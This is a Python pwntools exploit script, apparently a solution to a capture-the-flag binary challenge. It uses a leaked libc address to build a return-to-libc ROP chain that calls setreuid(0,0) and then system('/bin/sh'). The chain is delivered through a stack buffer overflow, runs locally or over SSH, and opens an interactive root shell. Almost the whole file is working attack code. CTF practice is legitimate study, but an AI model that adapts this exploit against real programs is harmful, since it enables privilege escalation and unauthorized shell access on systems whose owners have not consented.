#!/usr/bin/env python

from pwn import *
import os

context.arch = "x86_64"
get_flag = False
chall_name = '7.0'

def get_stack_leaked_address(p_output):
    initial_position = p_output.find('0x')
    final_position = p_output.find('.\n\n')
    stack_leak = p_output[initial_position:final_position]
    print('p_output:')
    print(p_output)
    print('stack:')
    print(stack_leak)
    return int(stack_leak, 16)

def run_with_gdb(p):
    gdb.attach(p,'''
    b *challenge+380''')

def run_exploit(p, debug, chall_path):
    if debug:
        run_with_gdb(p)
            
    # get the leaked system libc address
    process_output = p.recv(timeout=2).decode()    
    system_address = get_stack_leaked_address(process_output)

    # calculating and setting libc base
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    system_libc_offset = libc.sym.system
    libc_base = system_address - system_libc_offset
    libc.address = libc_base # setting the base on our ELF object

    # getting /bin/sh address
    bin_sh_libc = next(libc.search(b'/bin/sh'))
    
    # mouting rop chain
    rop = ROP(chall_path)
    # i need a empty ret address here because the movaps instrunction in system will trigger
    # a sigsev because of the ABI rule. The rule says that the stack has to be aligned to 16 bytes
    # before doing a call (more research needed on this)
    # https://newbedev.com/why-does-the-mac-abi-require-16-byte-stack-alignment-for-x86-32
    rop.raw(rop.ret.address)
    rop.call(libc.sym.setreuid, [0, 0])
    rop.call(p64(system_address), [bin_sh_libc])
    #rop.raw(rop.rdi.address)
    #rop.raw(p64(bin_sh_libc))
    #rop.raw(p64(system_address))
    print(rop.dump())

    overflow = cyclic(400, n=8)
    overflow_until_ret = b'A' * cyclic_find('faaaaaaa', n=8)
    #p.send(overflow)
    p.send(overflow_until_ret + rop.chain())

    p.interactive()

if get_flag:
    ssh_connection = ssh(host='',user='hacker')
    ssh_connection.set_working_directory(b'/home/hacker')

    process_full_path = '/challenge/' + chall_name
    p = ssh_connection.run(process_full_path)

    run_exploit(p, False, chall_name)
    ssh_connection.close()
else:
    process_full_path = './' + chall_name
    p = process(process_full_path)
    run_exploit(p, True, process_full_path)
